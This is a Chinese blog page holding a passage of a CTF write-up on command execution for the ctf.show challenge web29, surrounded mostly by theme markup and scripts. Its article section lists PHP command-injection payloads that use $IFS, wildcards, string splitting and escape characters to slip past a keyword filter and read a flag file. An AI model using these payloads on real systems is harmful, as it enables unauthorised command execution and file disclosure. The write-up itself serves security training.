@@ -1,0 +1,2488 @@
+<!DOCTYPE html>
+
+<head>
+	
+	<title>命令执行 - wanan</title>
+	<meta charset="utf-8">
+	
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+	
+	<meta name="description" content="web29 源码开局  拼接 c&#x3D;system(&#39;a&#x3D;g;cat$IFS$1fla$a.php&#39;); c&#x3D;system(&#39;1;a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat$IFS$a$c$d.php&#39;);   或者 ?c&#x3D;system(&quot;nl fla?????&quot;); ?c&#x3D;system(&quot;nl fla*&quot;); ?c&#x3D;echo &#96;nl fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行">
+<meta property="og:url" content="https://lovewanan.github.io/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="web29 源码开局  拼接 c&#x3D;system(&#39;a&#x3D;g;cat$IFS$1fla$a.php&#39;); c&#x3D;system(&#39;1;a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat$IFS$a$c$d.php&#39;);   或者 ?c&#x3D;system(&quot;nl fla?????&quot;); ?c&#x3D;system(&quot;nl fla*&quot;); ?c&#x3D;echo &#96;nl fl">
+<meta property="og:locale">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262021706.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029492.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029538.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292239718.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011446405.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011447289.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011627518.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011757187.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758828.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758209.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800030.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800342.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204021330313.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162441419.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162510204.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403150504271.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154526590.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154702204.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154718043.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154902410.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403155124971.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403161216118.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403163219886.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403171847531.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181813720.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181913365.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184156712.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184225406.png">
+<meta property="article:published_time" content="2022-04-17T14:37:17.297Z">
+<meta property="article:modified_time" content="2022-04-18T07:29:06.716Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="ctf.show">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262021706.png">
+
+	<meta name="theme-color" content="#5e72e4">
+	<meta name="theme-color-rgb" content="94,114,228">
+	<meta name="theme-color-origin" content="#5e72e4">
+	<meta name="argon-enable-custom-theme-color" content="true">
+	<meta name="theme-card-radius" content="4">
+	<meta name="theme-version" content="1.0.2">
+	<link rel="icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
+	<link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
+
+	
+<link rel="stylesheet" href="/assets/argon_css_merged.css">
+
+	
+<link rel="stylesheet" href="/style.css">
+
+	
+<link rel="stylesheet" href="//fonts.loli.net/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&display=swap.css">
+
+	
+<script src="/assets/argon_js_merged.js"></script>
+
+	
+<script src="/assets/js/argon.min.js"></script>
+
+	
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+	
+
+	<script>
+		var argonConfig = {
+			language: "zh_CN",
+			
+				zoomify: {
+					duration: 200,
+					easing: "cubic-bezier(0.4,0,0,1)",
+					scale: 0.9
+				},
+			
+			pangu: "false",
+			
+				lazyload: {
+					threshold: 800,
+					effect: "fadeIn"
+				},
+			
+			disable_pjax: false,
+			headroom: false
+		}
+	</script>
+	<script>
+		var darkmodeAutoSwitch = "false";
+		function setDarkmode(enable){
+			if (enable == true){
+				$("html").addClass("darkmode");
+			}else{
+				$("html").removeClass("darkmode");
+			}
+			$(window).trigger("scroll");
+		}
+		function toggleDarkmode(){
+			if ($("html").hasClass("darkmode")){
+				setDarkmode(false);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
+			}else{
+				setDarkmode(true);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
+			}
+		}
+		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
+			setDarkmode(true);
+		}
+		function toggleDarkmodeByPrefersColorScheme(media){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			if (media.matches){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		function toggleDarkmodeByTime(){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			let hour = new Date().getHours();
+			if (hour < 7 || hour >= 22){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		if (darkmodeAutoSwitch == 'system'){
+			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
+			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
+			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
+		}
+		if (darkmodeAutoSwitch == 'time'){
+			toggleDarkmodeByTime();
+		}
+		if (darkmodeAutoSwitch == 'alwayson'){
+			setDarkmode(true);
+		}
+
+		function toggleAmoledDarkMode(){
+			$("html").toggleClass("amoled-dark");
+			if ($("html").hasClass("amoled-dark")){
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
+			}else{
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
+			}
+		}
+		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
+			$("html").addClass("amoled-dark");
+		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
+			$("html").removeClass("amoled-dark");
+		}
+	</script>
+	<script>
+		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
+			$("html").addClass("using-safari");
+		}
+	</script>
+
+	
+		
+<script src="/assets/vendor/smoothscroll/smoothscroll1.js"></script>
+
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+
+<style id="themecolor_css">
+	
+	:root{
+		--themecolor: #5e72e4;
+		--themecolor-dark0: #5368E2;
+		--themecolor-dark: #485FE0;
+		--themecolor-dark2: #324CDD;
+		--themecolor-dark3: #233DD2;
+		--themecolor-light: #8A98EB;
+		--themecolor-rgbstr: 94,114,228;
+		--themecolor-gradient: linear-gradient(150deg,var(--themecolor-light) 15%, var(--themecolor) 70%, var(--themecolor-dark0) 94%);
+
+	}
+</style>
+<style id="theme_cardradius_css">
+	:root{
+		--card-radius: 4px;
+	}
+</style>
+
+<body>
+<div id="toolbar">
+	<header class="header-global">
+		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
+			<div class="container">
+				
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="navbar-toggler-icon"></span>
+				</button>
+				<a class="navbar-brand" href="/">wanan</a>
+				<div class="navbar-collapse collapse" id="navbar_global">
+					<div class="navbar-collapse-header">
+						<div class="row">
+							<div class="col-6 collapse-brand"></div>
+							<div class="col-6 collapse-close">
+								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+									<span></span>
+									<span></span>
+								</button>
+							</div>
+						</div>
+					</div>
+					<ul id="navbar_search_btn_mobile" class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" style="padding-left: 5px;">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+					
+							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
+								
+										<li class='nav-item'>
+											<a href='/' class='nav-link' >
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>首页</span>
+											</a>
+											
+										</li>
+									
+										<li class='nav-item dropdown'>
+											<a href='' class='nav-link' onclick='return false;' data-toggle='dropdown' no-pjax>
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>分类</span>
+											</a>
+											
+													<div class="dropdown-menu">
+														
+															<a href='/categories/ctf/' class='dropdown-item'>ctf</a>
+														
+															<a href='/categories/ctf/sql%E6%B3%A8%E5%85%A5/' class='dropdown-item'>sql注入</a>
+														
+															<a href='/categories/java%E7%9F%A5%E8%AF%86/' class='dropdown-item'>java知识</a>
+														
+															<a href='/categories/ctf/php%E7%9F%A5%E8%AF%86' class='dropdown-item'>php知识</a>
+														
+															<a href='/categories/BUUCTF' class='dropdown-item'>BUUCTF</a>
+														
+															<a href='/categories/Linux' class='dropdown-item'>Linux</a>
+														
+															<a href='/categories/ctfshow' class='dropdown-item'>ctf.show</a>
+														
+													</div>
+												
+										</li>
+									
+							</ul>
+						
+					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" id="navbar_search_btn_pc">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+				</div>
+				
+				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
+			</div>
+		</nav>
+	</header>
+</div>
+<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">搜索</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<!-- TODO -->
+<div class="form-group mb-3">
+	<div class="input-group input-group-alternative">
+		<div class="input-group-prepend">
+			<span class="input-group-text"><i class="fa fa-search"></i></span>
+		</div>
+		<input id="local-search-input" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" data-search.path="search.xml" data-config.root="/">
+	</div>
+	<div id="local-search-result"></div>
+</div>
+
+			</div>
+		</div>
+	</div>
+</div>
+<!--Banner-->
+<section id="banner" class="banner section section-lg section-shaped">
+	<div class="shape shape-style-1 shape-primary">
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+	</div>
+
+	
+	<div id="banner_container" class="banner-container container text-center">
+		
+			<div class="banner-title text-white"><span class="banner-title-inner">wanan</span>
+		
+		</div>
+	</div>
+	
+		<style>
+			section.banner{
+				background-image: url(/assets/img/banner.jpg) !important;
+			}
+		</style>
+	
+</section>
+
+
+	<style>
+		#content:before {
+			content: '';
+			display: block;
+			position: fixed;
+			left: 0;
+			right: 0;
+			top: 0;
+			bottom: 0;
+			z-index: -2;
+			background: url(/assets/img/banner.jpg);
+			background-position: center;
+			background-size: cover;
+			background-repeat: no-repeat;
+			opacity: 1;
+			transition: opacity .5s ease;
+		}
+		html.darkmode #content:before{
+			filter: brightness(0.65);
+		}
+		
+			#content:after {
+				content: '';
+				display: block;
+				position: fixed;
+				left: 0;
+				right: 0;
+				top: 0;
+				bottom: 0;
+				z-index: -2;
+				background: url(/assets/img/banner.jpg);
+				background-position: center;
+				background-size: cover;
+				background-repeat: no-repeat;
+				opacity: 0;
+				transition: opacity .5s ease;
+			}
+			html.darkmode #content:after {
+				opacity: 1;
+			}
+			html.darkmode #content:before {
+				opacity: 0;
+			}
+		
+		
+			#banner, #banner .shape {
+				background: transparent !important;
+			}
+		
+	</style>
+
+
+
+
+<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
+	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
+		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
+		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
+	</button>
+	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
+		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
+	</button>
+	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button" <-% theme.fab_show_gotocomment_button ? "" : "style='display: none;'"  aria-label="Comment" tooltip="评论">
+		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
+	</button>
+	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_darkmode_button ? "" : "style='display: none;'"  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
+		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
+	</button>
+	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_settings_button ? "" : "style='display: none;'"  aria-label="Open Blog Settings Menu" tooltip="设置">
+		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
+	</button>
+	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
+		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
+		<div class="blog-setting-item mt-3">
+			<div style="transform: translateY(-4px);"><div id="blog_setting_toggle_darkmode_and_amoledarkmode" tooltip-switch-to-darkmode="切换到夜间模式" tooltip-switch-to-blackmode="切换到暗黑模式"><span>夜间模式</span><span>暗黑模式</span></div></div>
+			<div style="flex: 1;"></div>
+			<label id="blog_setting_darkmode_switch" class="custom-toggle">
+				<span class="custom-toggle-slider rounded-circle"></span>
+			</label>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">字体</div>
+			<div>
+				<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">Sans Serif</button><button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">Serif</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">阴影</div>
+			<div>
+				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3 mb-3">
+			<div style="flex: 1;">滤镜</div>
+			<div id="blog_setting_filters" class="ml-3">
+				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
+				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
+				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
+				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mb-3">
+			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
+			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
+				<div id="blog_setting_card_radius"></div>
+			</div>
+		</div>
+		
+			<div class="blog-setting-item mt-1 mb-3">
+				<div style="flex: 1;">主题色</div>
+				<div id="theme-color-picker" class="ml-3"></div>
+			</div>
+		
+	</div>
+	<button id="fabtn_open_sidebar" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Sidebar Menu" tooltip="菜单">
+		<span class="btn-inner--icon"><i class="fa fa-bars"></i></span>
+	</button>
+	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
+		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
+		<span id="fabtn_reading_progress_details">0%</span>
+	</button>
+</div>
+
+<div id="content" class="site-content">
+
+
+	<script src="https://cdn.jsdelivr.net/npm/@waline/client"></script>
+
+
+
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+		  var hm = document.createElement("script");
+		  hm.src = "https://hm.baidu.com/hm.js?853baf6befa4784c85c2f47223a04efb" ;
+		  var s = document.getElementsByTagName("script")[0]; 
+		  s.parentNode.insertBefore(hm, s);
+		})();
+		</script>
+		
+
+
+
+
+
+
+<div class="page-information-card-container">
+	
+</div>
+
+<div id="sidebar_mask"></div>
+<aside id="leftbar" class="leftbar widget-area" role="complementary">
+		
+		<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
+			<div class="leftbar-banner card-body">
+				<span class="leftbar-banner-title text-white">wanan</span>
+				
+				
+			</div>
+			
+			
+				<ul id='leftbar_part1_menu' class='leftbar-menu'>
+					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li>
+				</ul>
+			
+			<div class="card-body text-center leftbar-search-button">
+				<button id="leftbar_search" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button" data-toggle="modal" data-target="#argon_search_modal" >
+					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索
+				</button>
+			</div>
+		</div>
+		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
+			<div id="leftbar_part2_inner" class="card-body">
+				
+				<div class="nav-wrapper" style="padding-top: 5px;">
+	                <ul class="nav nav-pills nav-fill" role="tablist">
+						
+							<li class="nav-item sidebar-tab-switcher">
+								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
+							</li>
+						
+						<li class="nav-item sidebar-tab-switcher">
+							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
+						</li>
+	                </ul>
+				</div>
+				<div>
+					<div class="tab-content" style="padding: 10px 10px 0 10px;">
+						
+							<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
+								<div id="leftbar_catalog"></div>
+								<script type="text/javascript">
+									$(function () {
+										$(document).headIndex({
+											articleWrapSelector: '#post_content',
+											indexBoxSelector: '#leftbar_catalog',
+											subItemBoxClass: "index-subItem-box",
+											itemClass: "index-item",
+											linkClass: "index-link",
+											offset: 80,
+										});
+									})
+								</script>
+								
+							</div>
+						
+						<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
+							<img id="leftbar_overview_author_image" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" class="img-fluid rounded-circle shadow-sm" style="width: 100px;" alt="avatar">
+							<h6 id="leftbar_overview_author_name">wanan</h6>
+							<nav class="site-state">
+								<div class="site-state-item site-state-posts">
+									<a href="/archives">
+										<span class="site-state-item-count">58</span>
+										<span class="site-state-item-name">文章</span>
+									</a>
+								</div>
+								<div class="site-state-item site-state-categories">
+									<a data-toggle="modal" data-target="#blog_categories">
+										<span class="site-state-item-count">7</span>
+										<span class="site-state-item-name">分类</span>
+									</a>
+								</div>      
+								<div class="site-state-item site-state-tags">
+									<a data-toggle="modal" data-target="#blog_tags">
+										<span class="site-state-item-count">7</span>
+										<span class="site-state-item-name">标签</span>
+									</a>
+								</div>
+							</nav>
+							
+									<div class="site-author-links">
+										
+									</div>
+								
+							
+									<div class='site-friend-links'>
+										<div class='site-friend-links-title'><i class='fa fa-fw fa-link'></i> Links</div>
+										<ul class='site-friend-links-ul'>
+											
+												<li class='site-friend-links-item'>
+													<a href='https://argon-docs.solstice23.top/#/' rel='noopener' target='_blank'>Argon</a>
+												</li>
+											
+										</ul>
+									</div>
+								
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+</aside>
+<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">分类</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/categories/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/categories/ctf/" rel="tag">ctf <span class="tag-num">26</span></a><a class="badge badge-secondary tag" href="/categories/ctfshow/" rel="tag">ctfshow <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/categories/java%E7%9F%A5%E8%AF%86/" rel="tag">java知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/php%E7%9F%A5%E8%AF%86/" rel="tag">php知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">2</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">标签</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/tags/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/tags/bugctf/" rel="tag">bugctf <span class="tag-num">2</span></a><a class="badge badge-secondary tag" href="/tags/ctf-show/" rel="tag">ctf.show <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/xctf/" rel="tag">xctf <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界 <span class="tag-num">9</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<div id="primary" class="content-area">
+	<main id="main" class="site-main" role="main">
+		
+		
+			
+	<article class="post post-full card bg-white shadow-sm border-0 ">
+	<header class="post-header text-center">
+		
+		<a class="post-title" href="/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+		<div class="post-meta">
+			
+						
+						<div class="post-meta-detail post-meta-detail-time">
+							<i class="fa fa-clock-o" aria-hidden="true"></i>
+							<time title="发布于 2022-4-17 22:37:17 | 编辑于 2022-4-18 15:29:06">2022-4-17 22:37
+							</time>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-categories">
+							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
+							<a class="post-meta-detail-catagory-link" href="/categories/ctfshow/">ctfshow</a>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa fa-book" aria-hidden="true"></i>
+							<span id="busuanzi_container_page_pv">
+								阅读<span id="busuanzi_value_page_pv"></span>次
+							</span>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa-file-word-o" aria-hidden="true"></i>
+							10.8k 字
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-readingtime">
+							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
+							61 分钟
+						</div>
+					
+		</div>
+		
+	</header>
+
+	<div class="post-content" id="post_content">
+		<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262021706.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326202110674"></p>
+
+<p>源码开局</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029492.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326202926453"></p>
+
+<p><strong>拼接</strong></p>
+<pre><code>c=system(&#39;a=g;cat$IFS$1fla$a.php&#39;);
+c=system(&#39;1;a=f;d=ag;c=l;cat$IFS$a$c$d.php&#39;);
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029538.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326202939503"></p>
+
+<p>或者</p>
+<pre><code>?c=system(&quot;nl fla?????&quot;);
+?c=system(&quot;nl fla*&quot;);
+?c=echo `nl fl&#39;&#39;ag.php`;或者c=echo `nl fl“”ag.php`;
+?c=echo `nl fl\ag.php`;//转义字符绕过
